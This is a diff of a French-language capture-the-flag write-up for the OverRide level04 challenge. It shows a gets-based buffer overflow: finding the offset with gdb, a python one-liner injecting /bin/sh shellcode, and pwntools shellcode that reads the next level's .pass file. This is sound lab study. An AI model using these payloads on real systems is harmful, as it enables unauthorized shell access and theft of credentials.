@@ -2,7 +2,7 @@
 <a href="/level05"><img align='right' width=20x height=auto src="https://cdn.onlinewebfonts.com/svg/img_68680.png"></img></a>
 
 - Dans le child il y a un gets donc sans limite
-- On recupere le offset
+- On recupere donc le offset pour pouvoir l'overflow
 <pre>
 $> gdb ./level04 
 gdb-peda$ pattern create 200
@@ -23,7 +23,7 @@ gdb-peda$ pattern offset TAAq
 <strong>TAAq found at offset: 156</strong>
 </pre>
 
-- On recupere l'addresse de notre futur shellcode
+- On recupere ensuite l'addresse de notre futur shellcode
 <pre>
 $> echo a | ltrace -f ./level04 1>&-
 [pid 1737] \_\_libc_start_main(0x80486c8, 1, -10540, 0x8048830, 0x80488a0 <unfinished ...>
@@ -45,14 +45,14 @@ $> printf '%x\n' -10848
 ffffffff<strong>ffffd5a0</strong>
 </pre>
 
-- Quand on met un shellcode basique avec le programme nous dit que les exec sont bloquer
+- Quand on met un shellcode basique, le programme nous dit que les exec sont interdit
 ```
-level04@OverRide:~$ (python -c "import struct; print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (156 - 21) + struct.pack('<I', 0xffffd5a0))") | ./level04 
+$> (python -c "import struct; print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (156 - 21) + struct.pack('<I', 0xffffd5a0))") | ./level04 
 Give me some shellcode, k
 no exec() for you
 ```
 
-- Donc on crée un shellcode qui print direct le fichier .pass
+- On genere donc un shellcode qui print le fichier directement
 <pre>
 >>> pwn.asm(pwn.shellcraft.i386.linux.cat('/home/users/level05/.pass'))
 b'jsh.pashl05/hlevehers/he/ush/hom\x89\xe31\xc91\xd2j\x05X\xcd\x80j\x01[\x89\xc11\xd2h\xff\xff\xff\x7f^1\xc0\xb0\xbb\xcd\x80'
